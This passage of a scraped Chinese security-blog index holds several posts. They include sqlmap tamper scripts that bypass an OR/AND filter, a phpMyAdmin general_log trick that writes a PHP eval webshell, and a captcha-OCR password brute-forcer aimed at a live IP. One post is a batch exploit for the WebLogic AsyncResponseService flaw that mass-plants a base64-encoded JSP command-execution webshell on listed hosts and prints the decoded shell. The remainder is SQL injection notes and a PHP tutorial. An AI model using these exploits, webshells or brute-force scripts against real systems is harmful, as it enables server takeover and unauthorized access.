'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125;else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;function blacklist($id)&#123; $id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive) $id= preg_replace('/AND/i',\"\", $id); //Strip out AND (non case sensitive) return $id;&#125;?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=\"../images/Less-25.jpg\" /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=\"../images/Less-25-1.jpg\" /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size='4' color= \"#33FFFF\"&gt;&lt;?phpecho \"Hint: Your Input is Filtered with following result: \".$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 分析： 将变量$id通过url的get请求方式传入sql语句中，执行查询语句。对URL键入的$id变量进行处理，使用PHP的内置函数preg_replace进行正则匹配将键入的$id变量的”or”和”and”替换成”” 绕过大小写绕过考虑过大小写绕过，将”or”和”and”替换成”Or”和”And”，在数据库中操作是成功的 但是在web端操作的时候发现，preg_replace函数是不区分大小写的，它把’and’这个单词不管是大小写都替换成’’l了 等价替换在数据库操作中， and=&amp;&amp; or=|| 在web端操作 ‘or’=’||’是可以的。 ‘and’=’&amp;&amp;’在web端不成功，分析一下原因 在php内’&amp;&amp;’为逻辑运算符，即是且，and的意思，他在传入php内已经被认为是逻辑运算符已经先被php执行了，就没传入sql语句中被sql执行了。 于是我把’&amp;&amp;’进行url编码。就可以传入sql语句中成功执行了。 tamper编写tamper写法规则讲一下tamper的写法规则 12345678910# 必须要导入的库from lib.core.enums import PRIORITY# 定义该tamper脚本的优先级__priority__ = PRIORITY.NORMALdef tamper(payload): '''此处是tamper的说明''' retVal = payload # 此处是用于修改payload的代码 # 返回修改后的payload return retVal 编写tamper按照绕过规则写tamper： ‘and’=’%26%26’ ‘or’=’||’ 12345678910111213141516#!/usr/bin/env python#coding=utf-8import randomimport refrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef tamper(payload, **kwargs): retVal = payload retVal = re.sub(r\"(OR)\", \"||\", retVal)#通过正则将OR替换成|| retVal = re.sub(r\"(AND)\", \"%26%26\", retVal)#通过正则将AND替换成%26%26 return retVal 执行一下试试： 然后我们发现他执行sql的’ORD’函数的时候也把’OR’替换成’||’了。这时候我们就得换个思路了。 再看一次规则： 他把’or’替换成’’ 如果我们键入’oorr’，根据他的规则就会变成’or’，那我们的效果也达到。 我们在web端尝试一下效果。 我们把这个思路写到tamper试一下。 12345678910111213141516#!/usr/bin/env python#coding=utf-8import randomimport refrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef tamper(payload, **kwargs): retVal = payload retVal = re.sub(r\"(OR)\", \"OORR\", retVal)#通过正则将OR替换成OORR retVal = re.sub(r\"(AND)\", \"%26%26\", retVal)#通过正则将AND替换成%26%26 return retVal 成了！！！ 试一下全部运行的结果。 不过同理，把’AND’替换成’AANDND’，不过这里不尝试了。","categories":[{"name":"python","slug":"python","permalink":"/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"getshell方式笔记","slug":"getshell方式笔记","date":"2019-06-08T16:00:00.000Z","updated":"2019-06-09T14:22:58.595Z","comments":true,"path":"2019/06/09/getshell方式笔记/","link":"","permalink":"/2019/06/09/getshell%E6%96%B9%E5%BC%8F%E7%AC%94%E8%AE%B0/","excerpt":"","text":"GetShell方式笔记PHPmyadmin root权限开启log日志getshell原理：利用phpmyadmin的sql执行日志的功能将一句话写入日志文件中 前提： 知道web的绝对路径 root权限 有写权限 日志功能未开启。 代码如下： 123set global general_log='on'; -- 开启日志功能SET global general_log_file='C:/Users/lf/phpstudy/PHPTutorial/WWW/wwwcmd.php'; -- 将日志文件保存在该路径下，日志文件为wwwcmd.phpSELECT '&lt;?php @eval($_POST[x]);?&gt;'; -- 算sql语句，写入一句话 写shell成功。 ——未完待续——","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"浅谈信息收集","slug":"浅谈信息收集","date":"2019-05-23T16:00:00.000Z","updated":"2019-05-24T12:30:21.908Z","comments":true,"path":"2019/05/24/浅谈信息收集/","link":"","permalink":"/2019/05/24/%E6%B5%85%E8%B0%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"浅谈信息收集最近做了一点任务，也和大佬谈了一下，在任务中感受到，前期的信息收集在渗透过程中真的尤为重要，你信息收集的越全面，越完整，可以让你在渗透过程中，找到更多的思路，于是乎便有了这篇文章，我想在这篇文章中，一点一点积累一些信息收集的方式方法。 移动端信息收集也是刚接触，之前也没遇到过移动端的信息安全类的项目，但是最近碰到了，之前看见过一篇关于app渗透的文章，我看着很有意思，一直记着，我这里把连接发出来，记一下。 黑客可以厉害到什么程度？ 里面有一个关于app的渗透，通过配置好 burpsuite 代理，并开始用 wireshark 抓包进行流量分析。 获取app交互的web API的网址，然后搜集web的基本信息再进行渗透工作。 不过最近我使用的是另一个抓包工具，也是挺好用的。 PC端使用fiddler实现手机抓包 不过和上面的大同小异。不过也是一个不错的方式。 手机端安装 Packet Capture 这个 App 直接在手机上做抓包应该是比较简单的： 不需要 root（用 VPNService 这个接口实现的本地代理） 有 MITM Proxy，可以查看 https 流量（有这条还要什么三轮车&gt;_&lt;） 适用于不走系统代理的 App app分析信息收集移动端安全框架：MobSF：概要与使用 有时候遇到一些app，你没有账号密码登录进行使用里面的功能就很难确定他交互的ip或是web是哪个，这个也是在这几天遇到的。让人头疼。 然后当时就一个师兄提出来的拿去这个开源系统内分析，有直接可以下载的docker 镜像，他可以逆向出app的源码，将里面的信息提取出来，生成报告，这就可以从里面获取一些你想要的信息，在之前的任务中就找到app开发的时候需要使用的app证书，证书内有一个域名，当时猜测就是该app的交互的web端（存在这个可能性），后来发现是该app的开发商，也可以从app开发商入手，也行从开发商那里拿到app源码和web源码，进行白盒测试。 web端信息搜集那些whois什么的，包括操作系统，web语言，中间件什么的，都不想讲了，因为可能很多一找一些教程都会了，还有用法，还很详细，在这里只想记录一下关于这两次任务给我的一点启发。 浅谈子域名搜集为什么就突然谈到子域名收集，因为其实我之前做子域名收集的时候，思维已经固定了，我一般通过两种方式收集 子域名爆破 平台子域名收集 子域名爆破，爆破的原理其实是通过枚举的方式来实现的（爆破域名顾名思义就是枚举的意思）枚举域名的A记录. 我感觉这种收集方式可能存在的问题是你枚举出来存在的域名不一定是目标的域名，所以可能即使你拿下了这个web，也是日歪了。 平台子域名收集，国内例如云悉平台，他做过收集，他给出的子域名大多都是准确无误的是你目标的，但是可能也存在平台收集的不全面的问题，经过这次任务，让我觉得前期的信息收集真的很重要，这次任务师兄也参与了，他也做了前期的信息收集，这次能在这个任务有所进展全靠他信息收集比我们更多，我们才能在这个任务中打开一个缺口。 我讲一下他收集子域名的方式。 当时他就是通过第二个采集方法，找到了一个站点，其实我当时挺奇怪的，但是我乍得一看这个站点的子域名似乎和目标站点也不搭边，web的内容和信息似乎也不太有关联，当时抱着试一试的心态进行了渗透测试，结果进去以后发现竟然存在目标站点的源码和数据库备份文件还是当年近两个月的，当时让我蛮惊喜，也引发了我现在的思考。因为我是第一次深刻体验到信息收集在在渗透实战中产生的效果。我觉得可能是各大搜索引擎收入这些子域名信息的思路和我的思路不同吧。 于是乎我又去观看了一些关于子域名信息收集的方式，在freebuf找到一篇我觉得挺不错的，也记录一下在下面 子域名搜集思路与技巧梳理 后面再看看有什么关于信息收集方面的启发我在一点点的记录在这篇文章内 ——未完待续——","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Python之验证码识别爆破","slug":"python之验证码识别爆破","date":"2019-05-02T04:00:00.000Z","updated":"2019-05-02T08:08:20.330Z","comments":true,"path":"2019/05/02/python之验证码识别爆破/","link":"","permalink":"/2019/05/02/python%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E7%88%86%E7%A0%B4/","excerpt":"一道比赛题目。","text":"一道比赛题目。 审题 三位数的密码。有个验证码。 考虑是否js代码验证，是就在html界面删除js代码绕过 如果不是js代码验证，检测验证码的时效性，是否达到一次一用，如果不是可以保持验证码一直爆破 审题结果：三位数密码，验证码时效性为一次一用（已经确定223密码是错误的） 验证码识别+密码爆破直接放代码 12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- coding: utf-8 -*-import requestsimport pytesseractfrom PIL import Imagedef shibie(count): # https://www.jianshu.com/p/60f7b65026fe 下载图片 src = 'http://39.100.83.188:8002/vcode.php?tdsourcetag=s_pcqq_aiomsg' r = requests.get(src) with open('验证码.png', 'wb') as f: f.write(r.content) # https://www.cnblogs.com/yeayee/p/4955506.html 识别验证码 image = Image.open('验证码.png') vcode = pytesseract.image_to_string(image) # print(\"验证码：\" + vcode) # tesseract-ocr的环境配置有点麻烦，教程在：https://blog.csdn.net/qq_37193537/article/details/81335165 url = 'http://39.100.83.188:8002/login.php' payload = &#123; 'username': \"admin\", 'pwd': count, 'user_code': vcode, 'Login': \"submit\" &#125; # 发送请求包 r = requests.request(\"POST\", url, data=payload) r.encoding = 'utf-8' print(r.text) return len(r.text)# 三位数生成count = 100while (count &lt; 1000): print(count) shibie(count) #判断返还text文本长度，为5则为验证码错误，再重新识别一次验证码，再次将当前密码再测试一次 while shibie(count) == 5: shibie(count) count = count + 1","categories":[{"name":"python","slug":"python","permalink":"/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"exp_批量","slug":"exp_批量","date":"2019-04-25T04:00:00.000Z","updated":"2019-04-26T13:44:36.238Z","comments":true,"path":"2019/04/25/exp_批量/","link":"","permalink":"/2019/04/25/exp_%E6%89%B9%E9%87%8F/","excerpt":"今早还没睡醒，就爆出来的洞，exp部分抄别人的，批量自己小小的写了一点。","text":"今早还没睡醒，就爆出来的洞，exp部分抄别人的，批量自己小小的写了一点。 expexp函数部分摘取自CNVD-C-2019-48814 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/python# coding:utf-8import requestsimport sysdef duqu(): f = open('7001.txt', 'r') # 文件为7001.txt sourceInLines = f.readlines() # 按行读出文件内容 f.close() new = [] # 定义一个空列表，用来存储结果 for line in sourceInLines: temp1 = line.strip('\\n') # 去掉每行最后的换行符'\\n' exp(temp1)def exp(temp1): url = \"http://\" + temp1 url_dir = \"/_async/AsyncResponseService\" vuln_url = url + url_dir webshell_name = 'shell.jsp' webshell_dir = \"servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/\" payload = \"&lt;soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:wsa=\\\"http://www.w3.org/2005/08/addressing\\\" xmlns:asy=\\\"http://www.bea.com/async/AsyncResponseService\\\"&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=\\\"http://bea.com/2004/06/soap/workarea/\\\"&gt;&lt;java version=\\\"1.4.0\\\" class=\\\"java.beans.XMLDecoder\\\"&gt;\\r\\n &lt;void class=\\\"java.lang.ProcessBuilder\\\"&gt;\\r\\n &lt;array class=\\\"java.lang.String\\\" length=\\\"3\\\"&gt;\\r\\n &lt;void index=\\\"0\\\"&gt;\\r\\n &lt;string&gt;/bin/bash&lt;/string&gt;\\r\\n &lt;/void&gt;\\r\\n &lt;void index=\\\"1\\\"&gt;\\r\\n &lt;string&gt;-c&lt;/string&gt;\\r\\n &lt;/void&gt;\\r\\n &lt;void index=\\\"2\\\"&gt;\\r\\n &lt;string&gt;echo IDwlQCBwYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YS5pby4qIiU+CjwlCiU+CjxIVE1MPjxCT0RZPgpDb21tYW5kcyB3aXRoIEpTUAo8Rk9STSBNRVRIT0Q9IkdFVCIgTkFNRT0ibXlmb3JtIiBBQ1RJT049IiI+CjxJTlBVVCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+CjwvRk9STT4KPHByZT4KPCUKaWYgKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSAhPSBudWxsKSB7CiAgICBvdXQucHJpbnRsbigiQ29tbWFuZDogIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSArICI8QlI+Iik7CiAgICBQcm9jZXNzIHA7CiAgICBpZiAoIFN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLnRvTG93ZXJDYXNlKCkuaW5kZXhPZigid2luZG93cyIpICE9IC0xKXsKICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY21kLmV4ZSAvQyAiICsgcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgIH0KICAgIGVsc2V7CiAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgIH0KICAgIE91dHB1dFN0cmVhbSBvcyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCk7CiAgICBJbnB1dFN0cmVhbSBpbiA9IHAuZ2V0SW5wdXRTdHJlYW0oKTsKICAgIERhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKICAgIFN0cmluZyBkaXNyID0gZGlzLnJlYWRMaW5lKCk7CiAgICB3aGlsZSAoIGRpc3IgIT0gbnVsbCApIHsKICAgIG91dC5wcmludGxuKGRpc3IpOwogICAgZGlzciA9IGRpcy5yZWFkTGluZSgpOwogICAgfQp9CiU+CjwvcHJlPgo8L0JPRFk+PC9IVE1MPiAKCg== |base64 -d &gt; %s%s&lt;/string&gt;\\r\\n &lt;/void&gt;\\r\\n &lt;/array&gt;\\r\\n &lt;void method=\\\"start\\\"/&gt;&lt;/void&gt;\\r\\n &lt;/java&gt;\\r\\n&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\" % ( webshell_dir, webshell_name) headers = &#123; 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0\", 'Accept': \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", 'Accept-Language': \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\", 'Accept-Encoding': \"gzip, deflate\", 'Connection': \"close\", 'Content-Type': \"text/xml\", 'Content-Length': \"2163\", 'cache-control': \"no-cache\" &#125; try: response = requests.request(\"POST\", vuln_url, data=payload, headers=headers, timeout=5) #将shell的路径写入文本 # f = open('test.txt','w+') # f.write(url + \"/bea_wls_internal/\" + webshell_name + \"?cmd=whoami\"+' \\n') print url + \"/bea_wls_internal/\" + webshell_name + \"?cmd=whoami\" print(response.text) except: print temp1 + ' Exceeding time duration'duqu() payload解析exp函数函数部分就是提交一个post请求用Linux命令echo写一个jsp_shellshell的内容是： 1234567891011121314151617181920212223242526272829303132&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;&lt;%%&gt;&lt;HTML&gt;&lt;BODY&gt;Commands with JSP&lt;FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"&gt;&lt;INPUT TYPE=\"text\" NAME=\"cmd\"&gt;&lt;INPUT TYPE=\"submit\" VALUE=\"Send\"&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;%if (request.getParameter(\"cmd\") != null) &#123; out.println(\"Command: \" + request.getParameter(\"cmd\") + \"&lt;BR&gt;\"); Process p; if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1)&#123; p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); &#125; else&#123; p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); &#125; OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125;&#125;%&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt; 其他朋友人字拖说：weblogin的默认路径不一定是/_async/AsyncResponseService","categories":[{"name":"python","slug":"python","permalink":"/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"SQL笔记","slug":"SQL笔记","date":"2019-04-21T09:00:00.000Z","updated":"2019-04-27T07:52:22.992Z","comments":true,"path":"2019/04/21/SQL笔记/","link":"","permalink":"/2019/04/21/SQL%E7%AC%94%E8%AE%B0/","excerpt":"","text":"SQL笔记MYSQLexp函数报错注入 exp溢出报错注入。利用exp溢出报错做布尔判断。 1SELECT EXP(710) 1SELECT EXP(709) 在（）括号中构造数值，用ASCII码。 ASCII码表 先看表内的内容。 username字段的第一个内容是adminadmin的第一个字母是a，在ASCII码中是97，构造一个语句： 1SELECT EXP(710-ascii(mid(username,1,1))--97) FROM `user` （）括号内的就相当于710-97+97 两个 - 相当于+ 加号 1SELECT EXP(710-ascii(mid(username,1,1))--96) FROM `user` mysql a.X 利用a.X标识位置查询 1SELECT 1,2,3 union select 4,5,6 from user 1select a.2 from (SELECT 1,2,3 union select 4,5,6 from user)a; 用a.2标识第二列，查出第二列的内容，将 SELECT 1,2,3 union select 4,5,6 from user 放进()括号中用作别名 1SELECT 1,2 UNION SELECT * FROM user where username = 'admin'; 1SELECT group_concat(a.2) from (SELECT 1,2 UNION SELECT * FROM user where username = 'admin')a; 查询第二列中，admin对应的内容。 ——持续更新——","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"/tags/SQL/"}]},{"title":"PHP学习笔记","slug":"PHP学习笔记","date":"2019-04-15T16:00:00.000Z","updated":"2019-05-15T13:21:08.780Z","comments":true,"path":"2019/04/16/PHP学习笔记/","link":"","permalink":"/2019/04/16/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"做笔记，以免忘记。","text":"做笔记，以免忘记。 PHP文件PHP 脚本在服务器上执行，然后将纯 HTML 结果发送回浏览器。 PHP 脚本可以放在文档中的任何位置。 PHP 脚本以 尖括号、问号、PHP 问号、尖括号结束 注意事项： PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。 PHP变量变量是用于存储信息的”容器”： 我们在PHP中的变量也是如此。不过有几个特点： 必须要以$ 开始 变量的首字母不能以数字开始 变量的名字区分大小写 变量不要用特殊符号、中文，_不算特殊符号 变量命名要有意义（别写xxx，aaa，ccc这种 变量名） $ 叫作美元符，英文单词：dollar。PHP的变量必须以美元符开始。说明搞PHP有“钱”图 PHP变量作用域PHP 有四种不同的变量作用域： · local · global · static · parameter globalglobal 关键字用于函数内访问全局变量。 static当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。 要做到这一点，请在您第一次声明变量时使用 static 关键字 PHP echo 和 print 语句echo 和 print 区别: echo - 可以输出一个或多个字符串 print - 只允许输出一个字符串，返回值总为 1 提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。 PHP的数据类型String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。 PHP对象对象数据类型也可以用于存储数据。 在 PHP 中，对象必须声明。 首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。 然后我们在类中定义数据类型，然后在实例化的类中使用数据类型： 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;?phpclass Car&#123; var $color; function __construct($color=\"green\") &#123; $this-&gt;color = $color; &#125; function what_color() &#123; return $this-&gt;color; &#125;&#125;function print_vars($obj) &#123; foreach (get_object_vars($obj) as $prop =&gt; $val) &#123; echo \"\\t$prop = $val\\n\"; &#125;&#125;// 实例一个对象$herbie = new Car(\"white\");// 显示 herbie 属性echo \"\\therbie: Properties\\n\";print_vars($herbie);?&gt; &lt;/body&gt;&lt;/html&gt; PHP常量设置常量，使用 define() 函数，函数语法如下： 1bool define ( string $name , mixed $value [, bool $case_insensitive = false ] ) 该函数有三个参数: name：必选参数，常量名称，即标志符。 value：必选参数，常量的值。 case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。 常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。 PHP运算符PHP 逻辑运算符 运算符 名称 描述 实例 x and y 与 如果 x 和 y 都为 true，则返回 true x=6 y=3 (x &lt; 10 and y &gt; 1) 返回 true x or y 或 如果 x 和 y 至少有一个为 true，则返回 true x=6 y=3 (x==6 or y==5) 返回 true x xor y 异或 如果 x 和 y 有且仅有一个为 true，则返回 true x=6 y=3 (x==6 xor y==3) 返回 false x &amp;&amp; y 与 如果 x 和 y 都为 true，则返回 true x=6 y=3 (x &lt; 10 &amp;&amp; y &gt; 1) 返回 true x || y 或 如果 x 和 y 至少有一个为 true，则返回 true x=6 y=3 (x==5 || y==5) 返回 false ! x 非 如果 x 不为 true，则返回 true x=6 y=3 !(x==y) 返回 true 三元运算符另一个条件运算符是”?:”（或三元）运算符 。 语法格式1(expr1) ? (expr2) : (expr3) 对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。 自 PHP 5.3 起，可以省略三元运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 TRUE 时返回 expr1，否则返回 expr3。 PHP Switch 语句 switch 语句用于根据多个不同条件执行不同动作。 PHP Switch 语句如果您希望有选择地执行若干代码块之一，请使用 switch 语句。 语法12345678910111213&lt;?phpswitch (n)&#123;case label1: 如果 n=label1，此处代码将执行; break;case label2: 如果 n=label2，此处代码将执行; break;default: 如果 n 既不等于 label1 也不等于 label2，此处代码将执行;&#125;?&gt; 工作原理：首先对一个简单的表达式 n（通常是变量）进行一次计算。将表达式的值与结构中每个 case 的值进行比较。如果存在匹配，则执行与 case 关联的代码。代码执行后，使用 break 来阻止代码跳入下一个 case 中继续执行。default 语句用于不存在匹配（即没有 case 为真）时执行。 PHP 数组在 PHP 中，array() 函数用于创建数组： 1array(); count() 函数用于返回数组的长度（元素的数量）： 实例1234&lt;?php cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo count(cars);?&gt; PHP 超级全局变量 超级全局变量在PHP 4.1.0之后被启用, 是PHP系统中自带的变量，在一个脚本的全部作用域中都可用。 PHP 超级全局变量PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。 PHP 超级全局变量列表: $GLOBALS $_SERVER $_REQUEST $_POST $_GET $_FILES $_ENV $_COOKIE $_SESSION PHP $_SERVER$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。 元素/代码 描述 $_SERVER[‘PHP_SELF’] 当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/test.php/foo.bar 的脚本中使用 $SERVER[‘PHP_SELF’] 将得到 /test.php/foo.bar。_FILE 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 $_SERVER[‘GATEWAY_INTERFACE’] 服务器使用的 CGI 规范的版本；例如，”CGI/1.1”。 $_SERVER[‘SERVER_ADDR’] 当前运行脚本所在的服务器的 IP 地址。 $_SERVER[‘SERVER_NAME’] 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: www.runoob.com) $_SERVER[‘SERVER_SOFTWARE’] 服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache/2.2.24) $_SERVER[‘SERVER_PROTOCOL’] 请求页面时通信协议的名称和版本。例如，”HTTP/1.0”。 $_SERVER[‘REQUEST_METHOD’] 访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。 $_SERVER[‘REQUEST_TIME’] 请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496) $_SERVER[‘QUERY_STRING’] query string（查询字符串），如果有的话，通过它进行页面访问。 $_SERVER[‘HTTP_ACCEPT’] 当前请求头中 Accept: 项的内容，如果存在的话。 $_SERVER[‘HTTP_ACCEPT_CHARSET’] 当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。 $_SERVER[‘HTTP_HOST’] 当前请求头中 Host: 项的内容，如果存在的话。 $_SERVER[‘HTTP_REFERER’] 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。) $_SERVER[‘HTTPS’] 如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。 $_SERVER[‘REMOTE_ADDR’] 浏览当前页面的用户的 IP 地址。 $_SERVER[‘REMOTE_HOST’] 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。 $_SERVER[‘REMOTE_PORT’] 用户机器上连接到 Web 服务器所使用的端口号。 $_SERVER[‘SCRIPT_FILENAME’] 当前执行脚本的绝对路径。 $_SERVER[‘SERVER_ADMIN’] 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：someone@runoob.com) $_SERVER[‘SERVER_PORT’] Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。 $_SERVER[‘SERVER_SIGNATURE’] 包含了服务器版本和虚拟主机名的字符串。 $_SERVER[‘PATH_TRANSLATED’] 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。 $_SERVER[‘SCRIPT_NAME’] 包含当前脚本的路径。这在页面需要指向自己时非常有用。FILE 常量包含当前脚本(例如包含文件)的完整路径和文件名。 $_SERVER[‘SCRIPT_URI’] URI 用来指定要访问的页面。例如 “/index.html”。 PHP $_REQUESTPHP $_REQUEST 用于收集HTML表单提交的数据。 PHP $_POSTPHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。 PHP $_GETPHP $_GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。 PHP 循环 - While 循环 循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。 PHP 循环在您编写代码时，您经常需要让相同的代码块一次又一次地重复运行。我们可以在代码中使用循环语句来完成这个任务。 在 PHP 中，提供了下列循环语句： while - 只要指定的条件成立，则循环执行代码块 do…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环 for - 循环执行代码块指定的次数 foreach - 根据数组中每个元素来循环代码块 while 循环while 循环将重复执行代码块，直到指定的条件不成立。 PHP 循环 - For 循环 循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。 for 循环for 循环用于您预先知道脚本需要运行的次数的情况。 语法1234for (初始值; 条件; 增量)&#123; 要执行的代码;&#125; 参数： 初始值：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。 条件：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。 增量：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。 注释：上面的初始值和增量参数可为空，或者有多个表达式（用逗号分隔）。 foreach 循环foreach 循环用于遍历数组。 语法1234foreach ($array as $value)&#123; 要执行代码;&#125; 每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。 PHP 函数 PHP 的真正威力源自于它的函数。 在 PHP 中，提供了超过 1000 个内建的函数。 创建 PHP 函数函数是通过调用函数来执行的。 语法123456&lt;?phpfunction functionName()&#123; // 要执行的代码&#125;?&gt; PHP 函数准则： 函数的名称应该提示出它的功能 函数名称以字母或下划线开头（不能以数字开头） PHP 函数 - 添加参数为了给函数添加更多的功能，我们可以添加参数，参数类似变量。 参数就在函数名称后面的一个括号内指定。 PHP 函数 - 返回值如需让函数返回一个值，请使用 return 语句。 PHP 魔术常量PHP 向它运行的任何脚本提供了大量的预定义常量。 不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。 有八个魔术常量它们的值随着它们在代码中的位置改变而改变。 PHP 命名空间(namespace)PHP 命名空间可以解决以下两类问题： 用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。 为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。 PHP 面向对象对象的主要三个特性： 对象的行为：可以对 